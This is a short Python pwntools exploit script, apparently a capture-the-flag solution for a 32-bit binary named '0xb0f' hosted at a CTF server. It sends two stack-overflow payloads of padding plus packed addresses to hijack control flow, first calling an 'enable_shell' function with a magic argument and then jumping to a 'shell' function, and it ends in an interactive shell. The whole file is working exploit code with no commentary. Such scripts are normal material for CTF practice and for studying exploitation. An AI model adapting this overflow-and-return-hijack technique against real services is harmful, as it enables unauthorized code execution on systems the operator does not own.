
#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = "pwn.pwnme.fr"
PORT = 7007

exe = ELF("./0xb0f")

libc = ELF("./libc-2.27.so")

context.log_level = 'info'

ret = 0x080483ce # ret


def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(["strace", "-o", "strace.out", "./0xb0f"])

    return r


def main():
    global r

    enable_shell = 0x080485c6
    shell = 0x0804861e
    get_int_input = 0x0804869a

    payload = b"A" * 22
    payload += p32(enable_shell)
    payload += p32(get_int_input)
    payload += p32(0xcafec0de)



    payload2 = b"B" * 22
    payload2 += p32(shell)
    payload2 += p32(0xdeadbeef)
    payload2 += p32(0xdeadbeef)


    r = conn()

    rep = r.recv()
    print(rep.decode())

    r.send(payload + b'\n')
    rep = r.recv()
    print(rep.decode())

    r.send(payload2 + b'\n')


    r.interactive()


if __name__ == "__main__":
    main()
